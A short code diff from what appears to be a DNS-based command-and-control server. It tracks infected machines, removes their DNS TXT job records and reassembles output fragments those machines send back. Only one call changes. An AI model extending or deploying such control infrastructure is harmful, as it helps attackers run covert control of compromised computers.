@@ -30,7 +30,7 @@ class ExecService:
         machine.ip = ip
         machine.save()
 
-        DnsService().remove_job_txt(machine)
+        DnsService().remove_job_txt(machine).apply()
 
     def process_job_return_fragment(self, machine_id: str, data: str, chunk_id: str):
         machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()
